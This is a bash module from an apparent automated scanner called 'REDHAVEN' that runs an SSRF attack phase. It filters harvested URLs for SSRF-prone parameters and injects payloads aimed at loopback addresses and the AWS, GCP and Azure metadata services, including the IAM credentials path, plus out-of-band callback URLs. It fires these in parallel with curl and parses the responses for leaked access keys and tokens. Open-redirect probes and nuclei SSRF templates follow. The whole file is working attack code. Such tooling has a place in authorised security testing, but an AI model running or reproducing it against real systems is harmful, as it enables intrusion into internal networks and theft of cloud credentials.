#!/bin/bash
# REDHAVEN Module — Sourced by scanner.sh
# Do not run directly

# === SSRF STORM ===
# 10. SSRF STORM v2 (Smart Targeting + Multi-Payload + Response Analysis)
run_ssrf_storm() {
    if check_dependency "$OUT_DIR/vulns/ssrf.txt" "SSRF Storm"; then return; fi
    log_phase "10: SSRF STORM v2 (SMART TARGETING + RESPONSE ANALYSIS)"
    
    mkdir -p "$OUT_DIR/.temp" "$OUT_DIR/vulns"
    : > "$OUT_DIR/vulns/ssrf.txt"
    local finding_count=0
    
    if [ ! -s "$OUT_DIR/endpoints/clean_urls.txt" ]; then
        log_warn "No clean URLs found for SSRF testing. Skipping phase."
        return
    fi
    
    # ── STEP 1: SMART TARGET SELECTION ──
    log_step "Filtering URLs with SSRF-prone parameters..."
    
    # Only test URLs that contain parameters likely to fetch external resources
    grep -iE "(url|redirect|proxy|fetch|img|src|href|path|load|endpoint|dest|target|uri|location|domain|host|page|site|feed|rss|callback|return|checkout_url|continue|data|reference|next|file|document|folder|root|dir|show|navigation|open|read|download|val)=" \
        "$OUT_DIR/endpoints/clean_urls.txt" | uro | sort -u > "$OUT_DIR/.temp/ssrf_targets.txt" 2>/dev/null || true
    
    local ssrf_count=$(wc -l < "$OUT_DIR/.temp/ssrf_targets.txt" 2>/dev/null || echo 0)
    local total=$(wc -l < "$OUT_DIR/endpoints/clean_urls.txt")
    log_stat "Total URLs" "$total"
    log_stat "SSRF-prone URLs (filtered)" "$ssrf_count"
    
    if [ "$ssrf_count" -eq 0 ]; then
        log_warn "No SSRF-prone parameters found. Running nuclei fallback..."
        nuclei -l "$OUT_DIR/endpoints/clean_urls.txt" -tags ssrf -c 50 -rl 150 -o "$OUT_DIR/vulns/ssrf.txt" -dr -duc 2>/dev/null || true
        return
    fi
    
    # ── STEP 2: MULTI-PAYLOAD INJECTION ──
    log_step "Injecting SSRF payloads and analyzing responses..."
    
    local payloads=(
        "http://127.0.0.1"
        "http://localhost"
        "http://169.254.169.254/latest/meta-data/"
        "http://[::1]"
        "http://0.0.0.0"
        "http://2130706433"
        "http://017700000001"
        "http://0x7f000001"
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        "http://metadata.google.internal/computeMetadata/v1/"
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
        "http://169.254.169.254/metadata/v1/"
    )
    
    # Add OOB payloads when callback domain is configured
    if [ -n "$OOB_DOMAIN" ]; then
        payloads+=(
            "http://ssrf.${OOB_DOMAIN}"
            "http://${OOB_DOMAIN}/ssrf-probe"
            "https://${OOB_DOMAIN}/ssrf-probe"
        )
        log_step "OOB callback enabled: ${OOB_DOMAIN}"
    fi
    
    # Process top 100 targets to avoid overloading
    head -n 100 "$OUT_DIR/.temp/ssrf_targets.txt" > "$OUT_DIR/.temp/ssrf_top100.txt"
    
    # ── PARALLEL APPROACH: Generate all injected URLs, blast with parallel curl ──
    log_step "Generating injection matrix (URLs × payloads)..."
    mkdir -p "$OUT_DIR/.temp/ssrf_responses"
    : > "$OUT_DIR/.temp/ssrf_injected_map.txt"
    
    local inject_id=0
    while IFS= read -r url; do
        [ -z "$url" ] && continue
        for payload in "${payloads[@]}"; do
            local injected=$(echo "$url" | qsreplace "$payload" 2>/dev/null || echo "")
            [ -z "$injected" ] && continue
            inject_id=$((inject_id + 1))
            echo "${inject_id}|${url}|${payload}|${injected}" >> "$OUT_DIR/.temp/ssrf_injected_map.txt"
        done
    done < "$OUT_DIR/.temp/ssrf_top100.txt"
    
    local total_injections=$(wc -l < "$OUT_DIR/.temp/ssrf_injected_map.txt" 2>/dev/null || echo 0)
    log_stat "Injection matrix" "${total_injections} requests"
    
    if [ "$total_injections" -gt 0 ]; then
        log_step "Firing parallel SSRF probes (20 concurrent)..."
        
        # Fire all requests in parallel, save response body + metadata
        cut -d'|' -f1,4 "$OUT_DIR/.temp/ssrf_injected_map.txt" | \
            parallel -j 20 --timeout 10 --colsep '\\|' \
            'curl -sL --max-time 8 -o '"$OUT_DIR"'/.temp/ssrf_responses/{1}.body -w "%{http_code}|%{size_download}" {2} > '"$OUT_DIR"'/.temp/ssrf_responses/{1}.meta 2>/dev/null || echo "000|0" > '"$OUT_DIR"'/.temp/ssrf_responses/{1}.meta' 2>/dev/null || true
        
        # ── BATCH RESPONSE ANALYSIS ──
        log_step "Analyzing responses for SSRF indicators..."
        
        while IFS='|' read -r id orig_url payload injected; do
            [ -z "$id" ] && continue
            
            local meta_file="$OUT_DIR/.temp/ssrf_responses/${id}.meta"
            local body_file="$OUT_DIR/.temp/ssrf_responses/${id}.body"
            
            [ ! -f "$meta_file" ] && continue
            
            local status_code=$(cut -d'|' -f1 "$meta_file" 2>/dev/null || echo "000")
            local resp_size=$(cut -d'|' -f2 "$meta_file" 2>/dev/null || echo "0")
            
            [ "$status_code" = "000" ] || [ "$resp_size" = "0" ] && continue
            [ ! -f "$body_file" ] && continue
            
            local body=$(cat "$body_file" 2>/dev/null || echo "")
            
            # Check for AWS metadata indicators
            if echo "$body" | grep -qiE "ami-id|instance-id|iam.*credentials|security-credentials|AccessKeyId|SecretAccessKey|Token"; then
                echo "[CRITICAL] AWS METADATA LEAK: $injected" >> "$OUT_DIR/vulns/ssrf.txt"
                echo "  Payload: $payload" >> "$OUT_DIR/vulns/ssrf.txt"
                echo "  Response preview: ${body:0:200}" >> "$OUT_DIR/vulns/ssrf.txt"
                finding_count=$((finding_count + 1))
            fi
            
            # Check for internal service indicators
            if echo "$body" | grep -qiE "internal server|localhost|127\.0\.0\.1|192\.168\.|10\.[0-9]|172\.(1[6-9]|2[0-9]|3[01])\."; then
                echo "[HIGH] INTERNAL NETWORK RESPONSE: $injected" >> "$OUT_DIR/vulns/ssrf.txt"
                echo "  Payload: $payload" >> "$OUT_DIR/vulns/ssrf.txt"
                finding_count=$((finding_count + 1))
            fi
            
            # Check for GCP metadata
            if echo "$body" | grep -qiE "computeMetadata|project-id|service-accounts|access_token"; then
                echo "[CRITICAL] GCP METADATA LEAK: $injected" >> "$OUT_DIR/vulns/ssrf.txt"
                echo "  Payload: $payload" >> "$OUT_DIR/vulns/ssrf.txt"
                finding_count=$((finding_count + 1))
            fi
            
            # Check for Azure IMDS
            if echo "$body" | grep -qiE "\"compute\"|\"network\"|vmId|subscriptionId|resourceGroupName"; then
                echo "[CRITICAL] AZURE IMDS LEAK: $injected" >> "$OUT_DIR/vulns/ssrf.txt"
                echo "  Payload: $payload" >> "$OUT_DIR/vulns/ssrf.txt"
                finding_count=$((finding_count + 1))
            fi
            
            # Check for response size difference (potential blind SSRF)
            if [ "$status_code" = "200" ] && [ "$resp_size" -gt 100 ] 2>/dev/null; then
                local orig_size=$(curl -sL --max-time 5 -o /dev/null -w "%{size_download}" "$orig_url" 2>/dev/null || echo "0")
                local diff=$((resp_size - orig_size))
                [ "$diff" -lt 0 ] && diff=$((-diff))
                
                if [ "$diff" -gt 500 ] 2>/dev/null; then
                    echo "[MEDIUM] RESPONSE SIZE DIFFERENCE (potential blind SSRF): $injected" >> "$OUT_DIR/vulns/ssrf.txt"
                    echo "  Original: ${orig_size}B vs Injected: ${resp_size}B (diff: ${diff}B)" >> "$OUT_DIR/vulns/ssrf.txt"
                    finding_count=$((finding_count + 1))
                fi
            fi
        done < "$OUT_DIR/.temp/ssrf_injected_map.txt"
    fi
    
    rm -rf "$OUT_DIR/.temp/ssrf_responses" "$OUT_DIR/.temp/ssrf_resp.tmp"
    
    # ── STEP 3: OPEN REDIRECT CHECK (SSRF variant) ──
    log_step "Testing for URL-based open redirects (SSRF chain)..."
    
    grep -iE "(redirect|url|next|dest|return|checkout_url|continue)=" "$OUT_DIR/.temp/ssrf_targets.txt" | \
        head -n 50 | \
        qsreplace "https://httpbin.org/get" 2>/dev/null | \
        httpx -silent -status-code -location -mc 301,302,307 -threads 30 2>/dev/null | \
        grep -i "httpbin.org" >> "$OUT_DIR/vulns/ssrf.txt" 2>/dev/null || true
    
    # ── STEP 4: NUCLEI SUPPLEMENTARY ──
    log_step "Nuclei: Running SSRF templates..."
    nuclei -l "$OUT_DIR/.temp/ssrf_targets.txt" \
        -tags ssrf \
        -c 50 -rl 150 \
        -o "$OUT_DIR/.temp/nuclei_ssrf.txt" -dr -duc 2>/dev/null || true
    
    if [ -s "$OUT_DIR/.temp/nuclei_ssrf.txt" ]; then
        cat "$OUT_DIR/.temp/nuclei_ssrf.txt" >> "$OUT_DIR/vulns/ssrf.txt"
        finding_count=$((finding_count + $(wc -l < "$OUT_DIR/.temp/nuclei_ssrf.txt")))
    fi
    
    log_stat "SSRF Findings" "$finding_count"
    log_success "SSRF Storm v2 completed."
}

